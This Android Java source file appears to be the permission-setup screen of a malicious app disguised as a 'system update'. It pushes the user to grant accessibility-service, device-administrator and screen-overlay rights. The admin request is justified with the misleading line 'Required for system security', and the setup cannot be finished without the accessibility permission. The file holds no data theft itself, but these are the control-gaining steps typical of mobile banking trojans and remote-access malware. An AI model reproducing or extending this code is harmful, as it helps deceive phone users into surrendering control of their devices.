package com.systemupdate.app;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class PermissionSetupActivity extends Activity {

    private TextView statusA11y, statusAdmin, statusOverlay;
    private Button finishBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try { setContentView(R.layout.activity_permission_setup); }
        catch (Throwable t) { finish(); return; }

        statusA11y = findViewById(R.id.perm_status_a11y);
        statusAdmin = findViewById(R.id.perm_status_admin);
        statusOverlay = findViewById(R.id.perm_status_overlay);
        finishBtn = findViewById(R.id.perm_finish_btn);

        View btnA11y = findViewById(R.id.perm_btn_a11y);
        if (btnA11y != null) {
            btnA11y.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                }
            });
        }

        View btnAdmin = findViewById(R.id.perm_btn_admin);
        if (btnAdmin != null) {
            btnAdmin.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    ComponentName admin = new ComponentName(PermissionSetupActivity.this, PhantomDeviceAdminReceiver.class);
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system security.");
                    startActivity(intent);
                }
            });
        }

        View btnOverlay = findViewById(R.id.perm_btn_overlay);
        if (btnOverlay != null) {
            btnOverlay.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                }
            });
        }

        if (finishBtn != null) {
            finishBtn.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    DeviceStore.setSetupComplete(PermissionSetupActivity.this, true);
                    startActivity(new Intent(PermissionSetupActivity.this, DashboardActivity.class));
                    finish();
                }
            });
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        // FIXED: Matches the engine class name
        boolean a11yOn = PhantomAccessibilityService.isRunning();
        
        if (statusA11y != null) {
            statusA11y.setText(a11yOn ? "GRANTED" : "REQUIRED");
            statusA11y.setTextColor(getResources().getColor(a11yOn ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, PhantomDeviceAdminReceiver.class);
        boolean adminOn = dpm != null && dpm.isAdminActive(admin);
        if (statusAdmin != null) {
            statusAdmin.setText(adminOn ? "GRANTED" : "REQUIRED");
            statusAdmin.setTextColor(getResources().getColor(adminOn ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
        }

        boolean overlayOn = Settings.canDrawOverlays(this);
        if (statusOverlay != null) {
            statusOverlay.setText(overlayOn ? "GRANTED" : "REQUIRED");
            statusOverlay.setTextColor(getResources().getColor(overlayOn ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
        }

        if (finishBtn != null) finishBtn.setEnabled(a11yOn);
    }

    @Override
    public void onBackPressed() { moveTaskToBack(true); }
}